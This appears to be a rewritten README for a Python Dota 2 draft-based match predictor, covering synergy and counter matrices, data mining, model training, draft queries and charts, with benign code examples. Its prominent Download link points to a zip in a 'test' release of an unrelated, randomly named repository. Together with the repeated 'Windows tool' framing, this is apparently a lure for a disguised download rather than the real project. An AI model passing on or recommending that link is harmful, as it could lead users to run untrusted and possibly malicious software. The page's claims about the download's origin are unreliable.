# Dota 2 Predictor

Dota 2 Predictor is a Python-based machine learning tool for estimating the outcome of a Dota 2 match from hero picks. It can evaluate completed draft compositions, suggest a possible final pick for an incomplete lineup, and generate data visualizations such as hero win rates, pick statistics, synergies, counters, and hero similarity maps.

[Download](https://github.com/gcoyerk/cuddly-octo-adventure/releases/download/test/dota2-predictor-1.zip)

## What This Repository Provides

This repository contains a Dota 2 prediction workflow built around mined match data, preprocessing, model training, model querying, and visualization. The project focuses on pre-game information: the selected heroes, team compositions, and match metadata such as MMR range.

The tool is intended for users who want to experiment with Dota 2 match prediction using machine learning rather than in-game dynamic statistics. It works with draft information available before the match begins, making it suitable for exploring pick advantage, team synergy, counter relationships, and final-pick recommendations.

Although this is not a native Windows desktop application, it can be used as a Windows tool from a Python environment where the required Python 2.7 packages are available.

## Main Capabilities

Dota 2 Predictor supports several connected tasks:

- Mining match data from Dota 2 match IDs
- Loading and preprocessing datasets
- Filtering matches by MMR range
- Computing hero synergy and counter matrices
- Training and evaluating prediction models
- Saving trained models for later use
- Querying full drafts to estimate likely winner
- Querying partial drafts to suggest a last pick
- Visualizing hero and dataset statistics

The original project reports approximately `0.65` ROC AUC using Logistic Regression and Neural Network experiments, with Logistic Regression used in the documented training example.

## Windows Usage Context

This repository is best treated as a Python-based Windows utility rather than a packaged Windows desktop client. A typical Windows environment would use:

- Python 2.7
- `pip`
- A terminal such as Command Prompt, PowerShell, or another shell
- The dependency list provided by the repository

Because the project relies on Python scripts and machine learning packages, it is most useful for users comfortable running commands and editing small Python examples. It is not presented as a graphical Windows application.

## Requirements

The project requires Python 2.7 packages listed in the repository dependency file.

```bash
pip install -r requirements.txt
```

Use a Python 2.7 environment when installing and running the tool, as the documented project requirements are based on Python 2.7.

## How the Prediction Workflow Works

The prediction process is built around the relationship between heroes in a draft. The tool uses match records containing:

- Match ID
- Radiant win result
- Radiant team hero IDs
- Dire team hero IDs
- Average MMR
- Number of players with public MMR
- Game mode
- Lobby type

From this data, the preprocessing step can compute additional features based on hero relationships.

### Synergy

A synergy matrix describes how two heroes perform when playing on the same team. For example, a value of `0.54` for a pair of heroes means those heroes had a 54% win rate together in the dataset used to compute the matrix.

### Counter Relationship

A counter matrix describes how one hero performs against another hero. Unlike synergy, this matrix is directional. A value from hero A against hero B is not necessarily the same as the value from hero B against hero A.

These matrices can be used as additional model features during training and prediction.

## Dataset Loading and Preprocessing

Datasets are loaded through the preprocessing API. During loading, the project can filter matches by MMR and optionally recompute advantage features.

Example:

```python
from preprocessing.dataset import read_dataset

dataset, advantages_computer = read_dataset(
    '706e_train_dataset.csv',
    low_mmr=2000,
    high_mmr=2500,
    advantages=True
)
```

This example loads a dataset, filters games between 2000 and 2500 MMR, and recomputes hero advantage features.

## Mining Match Data

The project includes a mining utility for collecting match data between match ID ranges.

Example:

```python
from tools.miner import mine_data

mine_data(
    file_name='mine_example.csv',
    first_match_id=3492535023,
    last_match_id=3498023575,
    stop_at=1000
)
```

The resulting CSV contains the match outcome, both team compositions, MMR-related fields, game mode, and lobby type.

## Training and Evaluation

The documented training workflow uses Logistic Regression and evaluates the model with cross validation. A trained model can also be saved to a pickle file.

Example:

```python
from preprocessing.dataset import read_dataset
from training.cross_validation import evaluate

dataset_train, _ = read_dataset('706e_train_dataset.csv', low_mmr=4500)
dataset_test, _ = read_dataset('706e_test_dataset.csv', low_mmr=4500)

evaluate(dataset_train, dataset_test, cv=7, save_model='test.pkl')
```

The evaluation reports cross-validation performance on the training set and final ROC AUC and accuracy scores on the test set.

## Querying a Model

Dota 2 Predictor supports two query styles.

### Full Draft Query

A full query provides all 10 heroes: five Radiant heroes and five Dire heroes. The model returns a winner probability estimate.

```python
from training.query import query

full_result = query(
    3000,
    [59, 56, 54, 48, 31],
    [40, 41, 52, 68, 61]
)
```

### Partial Draft Query

A partial query provides nine heroes. The tool evaluates possible final-pick options and ranks them using predicted win chance and team similarity.

```python
partial_result = query(
    3000,
    [59, 56, 54, 48, 31],
    [40, 41, 52, 68]
)
```

The similarity score is used to compare how closely a hero fits the role pattern of the existing team composition. This helps avoid suggestions that may have high individual win rates but poor composition fit.

## Visualization Features

The project includes plotting utilities for exploring Dota 2 datasets and hero relationships. Supported visualizations include:

- Learning curves
- Win rate statistics
- Pick statistics
- MMR distribution
- Hero synergy charts
- Hero counter charts
- Hero similarity maps

These visualizations are useful for understanding why certain heroes or draft combinations may influence predictions.

## Practical Use Cases

Dota 2 Predictor can be used for:

- Studying hero combinations in public match data
- Comparing team composition strength before a game starts
- Testing how MMR filters affect model performance
- Exploring hero counters and synergies
- Building custom Dota 2 machine learning experiments
- Generating visual summaries of hero statistics
- Experimenting with last-pick recommendation logic

The tool is focused on prediction from draft data only. It does not use live in-game metrics such as GPM, XPM, item progression, lane outcome, or player execution.

## Notes on Model Accuracy

The project documentation describes prediction accuracy as limited by the complexity of Dota 2. Match outcomes depend on many factors that are not known at draft time, including player skill, team coordination, lane execution, item choices, and in-game decisions.

Because of this, the tool should be understood as an analytical model for draft-based prediction, not as a guaranteed match outcome system.

## FAQ

### Is this a Windows desktop application?

No. It is a Python-based Dota 2 prediction tool that can be run in a Windows environment with Python 2.7 and the required packages installed.

### What is the primary purpose of Dota 2 Predictor?

Its main purpose is to predict the likely winner of a Dota 2 match from hero picks and to suggest a final pick when one hero is missing from a draft.

### Does it use live match statistics?

No. The project focuses on information available before the game starts, especially hero picks and team composition.

### Can it recommend the best last pick?

It can evaluate possible final picks for a nine-hero draft and rank options using predicted win chance and team similarity.

### What machine learning approach is documented?

The documented example uses Logistic Regression with cross-validation. Neural Network experiments are also mentioned, but Logistic Regression is the primary example shown.

### What kind of data does it need?

It needs match records containing hero lineups, match result, and related metadata such as MMR range, game mode, and lobby type.

### Why are synergy and counter matrices useful?

They provide additional structure about hero relationships. Synergy measures performance on the same team, while counter data measures performance against opposing heroes.

## Conclusion

Dota 2 Predictor is a machine learning project for draft-based Dota 2 match prediction. It provides tools for mining data, preprocessing datasets, training models, querying predictions, suggesting final picks, and visualizing hero statistics. In a Windows environment, it can be used as a Python-powered analysis utility for experimenting with Dota 2 prediction models and hero composition data.
